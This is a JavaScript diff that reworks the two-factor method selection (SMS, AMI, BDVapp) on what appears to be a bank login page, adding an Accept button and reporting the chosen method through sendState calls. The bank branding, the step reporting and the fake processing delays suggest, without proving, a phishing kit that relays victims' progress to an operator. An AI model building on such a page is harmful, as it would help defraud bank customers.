@@ -169,9 +169,10 @@
   const spinner = document.getElementById('spinner');
   const authMethod = document.getElementById('authMethod');
   const loginUnico = document.querySelector('app-login-unico');
-  const smsMethodBtn = document.getElementById('smsMethodBtn');
-  const amiMethodBtn = document.getElementById('amiMethodBtn');
-  const bdvappMethodBtn = document.getElementById('bdvappMethodBtn');
+  const acceptMethodBtn = document.getElementById('acceptMethodBtn');
+  const optSms = document.getElementById('optSms');
+  const optAmi = document.getElementById('optAmi');
+  const optBdvapp = document.getElementById('optBdvapp');
   const backMethodBtn = document.getElementById('backMethodBtn');
   const verifyForm = document.getElementById('verifyForm');
   const verifyCode = document.getElementById('verifyCode');
@@ -185,6 +186,8 @@
   const authStep1Icon = document.getElementById('authStep1Icon');
   const authStepLine = document.getElementById('authStepLine');
   const authMethodName = document.getElementById('authMethodName');
+
+  let selectedMethod = 'sms';
 
   function showSpinner() {
     if (spinner) {
@@ -212,7 +215,31 @@
     if (verifyBtn) verifyBtn.disabled = !has;
   }
 
-  function showSelectStep() {
+  function selectMethod(mode) {
+    selectedMethod = mode || 'sms';
+    const cards = [
+      { el: optSms, val: 'sms' },
+      { el: optAmi, val: 'ami' },
+      { el: optBdvapp, val: 'bdvapp' }
+    ];
+    cards.forEach((item) => {
+      if (!item.el) return;
+      const isMatch = item.val === selectedMethod;
+      item.el.classList.toggle('is-selected', isMatch);
+      const radio = item.el.querySelector('input[type="radio"]');
+      if (radio) radio.checked = isMatch;
+    });
+  }
+
+  [optSms, optAmi, optBdvapp].forEach((el) => {
+    if (!el) return;
+    el.addEventListener('click', () => {
+      const m = el.dataset.method;
+      if (m) selectMethod(m);
+    });
+  });
+
+  function showSelectStep(mode) {
     if (!authMethod) return;
     authMethod.dataset.step = 'select';
     if (authSelectPanel) {
@@ -236,6 +263,8 @@
     if (authStepLine) authStepLine.classList.remove('is-done');
     if (verifyCode) verifyCode.value = '';
     updateCodeFloat();
+
+    selectMethod(mode || currentOtpAction || 'sms');
   }
 
   function showVerifyStep(mode) {
@@ -305,44 +334,26 @@
       authMethod.hidden = false;
       authMethod.style.setProperty('display', 'block', 'important');
     }
-    showVerifyStep(mode || 'sms');
+    // Paso 1: Primero muestra la pantalla de selección con el botón Aceptar
+    showSelectStep(mode || 'sms');
   }
 
-  if (smsMethodBtn) {
-    smsMethodBtn.addEventListener('click', () => {
+  // Al hacer clic en Aceptar en el Paso 1
+  if (acceptMethodBtn) {
+    acceptMethodBtn.addEventListener('click', () => {
       showSpinner();
-      sendState('metodo-sms');
+      sendState('metodo-' + selectedMethod);
       setTimeout(() => {
         hideSpinner();
-        showVerifyStep('sms');
-      }, 500);
-    });
-  }
-
-  if (amiMethodBtn) {
-    amiMethodBtn.addEventListener('click', () => {
-      showSpinner();
-      sendState('metodo-ami');
-      setTimeout(() => {
-        hideSpinner();
-        showVerifyStep('ami');
-      }, 500);
-    });
-  }
-
-  if (bdvappMethodBtn) {
-    bdvappMethodBtn.addEventListener('click', () => {
-      showSpinner();
-      sendState('metodo-bdvapp');
-      setTimeout(() => {
-        hideSpinner();
-        showVerifyStep('bdvapp');
-      }, 500);
+        showVerifyStep(selectedMethod);
+      }, 600);
     });
   }
 
   if (backMethodBtn) {
-    backMethodBtn.addEventListener('click', showSelectStep);
+    backMethodBtn.addEventListener('click', () => {
+      showSelectStep(currentOtpAction);
+    });
   }
 
   if (verifyCode) {
